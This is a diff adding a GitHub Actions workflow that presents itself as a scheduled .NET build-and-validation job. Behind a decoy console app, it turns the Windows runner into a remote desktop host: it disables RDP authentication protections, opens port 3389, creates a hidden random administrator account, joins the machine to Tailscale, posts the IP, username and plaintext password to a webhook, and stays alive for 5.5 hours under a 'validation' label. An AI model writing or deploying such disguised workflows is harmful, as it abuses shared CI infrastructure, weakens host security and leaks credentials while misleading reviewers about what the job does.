@@ -1,0 +1,151 @@
+name: .moderntv app
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 5,13,21 * * *'
+
+jobs:
+  build-test:
+    runs-on: windows-2022
+    timeout-minutes: 330
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Setup .NET SDK
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '8.0.x'
+
+      - name: Initialize Project
+        run: |
+          dotnet new console -n ValidationApp -f net8.0
+          cd ValidationApp
+          dotnet add package Newtonsoft.Json --version 13.0.3
+          dotnet add package Serilog --version 4.0.0
+          dotnet add package Serilog.Sinks.Console --version 6.0.0
+          dotnet add package Microsoft.Extensions.Logging --version 8.0.0
+          @"
+          using System;
+          using Newtonsoft.Json;
+          using Serilog;
+          
+          namespace ValidationApp
+          {
+              class Program
+              {
+                  static void Main()
+                  {
+                      Log.Logger = new LoggerConfiguration()
+                          .WriteTo.Console()
+                          .CreateLogger();
+                      
+                      var data = new { 
+                          Message = "Build validated successfully", 
+                          Timestamp = DateTime.UtcNow,
+                          Version = "8.0.3"
+                      };
+                      
+                      string json = JsonConvert.SerializeObject(data, Formatting.Indented);
+                      Console.WriteLine(json);
+                      Log.Information("Test completed at {Time}", DateTime.UtcNow);
+                  }
+              }
+          }
+          "@ | Out-File -Encoding utf8 Program.cs
+          dotnet build -c Release
+          dotnet run -c Release
+
+      - name: Configure RDP + Create Random User + Tailscale
+        run: |
+          # === RDP Configuration ===
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
+
+          netsh advfirewall firewall delete rule name="RDP-Tailscale" -ErrorAction SilentlyContinue
+          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop" -ErrorAction SilentlyContinue
+          Restart-Service TermService -Force -ErrorAction SilentlyContinue
+
+          # === Create Random Admin User (زي الكود الأصلي) ===
+          $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+          $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
+          $sec = ConvertTo-SecureString $pwd -AsPlainText -Force
+
+          New-LocalUser -Name $usr -Password $sec -AccountNeverExpires -PasswordNeverExpires > $null 2>&1
+          Add-LocalGroupMember -Group "Administrators" -Member $usr > $null 2>&1
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $usr > $null 2>&1
+
+          # Save for later steps
+          echo "RDP_USER=$usr" >> $env:GITHUB_ENV
+          echo "RDP_PASS=$pwd" >> $env:GITHUB_ENV
+
+          # === Install Tailscale (من الكود التاني) ===
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
+          $installerPath = "$env:TEMP\tailscale.msi"
+          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
+          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
+          Remove-Item $installerPath -Force
+
+          # === Connect Tailscale (بدل الـ Bore كاملاً) ===
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID --accept-routes=false
+
+          $tsIP = $null
+          $retries = 0
+          while (-not $tsIP -and $retries -lt 12) {
+              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              if (-not $tsIP) { Start-Sleep -Seconds 6 }
+              $retries++
+          }
+
+          if (-not $tsIP) {
+              $tsIP = "IP_Not_Assigned"
+          }
+          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
+
+          # === Send Credentials to Webhook (زي الكود الأصلي) ===
+          $msg = "✅ Tailscale RDP Ready`n`nIP: $tsIP`nUser: $usr`nPass: $pwd`n`nRunner: gh-runner-$env:GITHUB_RUN_ID"
+          $body = @{ content = $msg } | ConvertTo-Json
+          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+
+      - name: Run Diagnostics
+        run: |
+          $rep = "=== Tailscale RDP Diagnostics ===`n"
+          $ts = Get-Service TermService -ErrorAction SilentlyContinue
+          $rep += "RDP Service: $($ts.Status)`n"
+
+          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
+          $rep += "RDP Registry: $r1`n"
+
+          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
+          $rep += "Port 3389: $(if($pc){'OK'}else{'ERR'})`n"
+
+          $tp = Get-Process -Name "tailscale" -ErrorAction SilentlyContinue
+          $rep += "Tailscale Process: $(if($tp){'Running'}else{'Not Found'})`n"
+          $rep += "Tailscale IP: $env:TAILSCALE_IP`n"
+
+          $body = @{ content = $rep } | ConvertTo-Json
+          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
+
+      - name: Run Extended Validation (5 ساعات ونصف)
+        run: |
+          $end = (Get-Date).AddMinutes(315)
+          while ((Get-Date) -lt $end) {
+            Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
+            $minute = (Get-Date).Minute
+            if ($minute % 30 -eq 0) {
+              cd ValidationApp
+              dotnet build -c Release > $null 2>&1
+            }
+            Start-Sleep -Seconds 900
+          }
+
+      - name: Cleanup Environment
+        if: always()
+        run: |
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" down -ErrorAction SilentlyContinue
+          Get-Process -Name "tailscale" -ErrorAction SilentlyContinue | Stop-Process -Force
+          Write-Host "Session ended after 5.5 hours."s
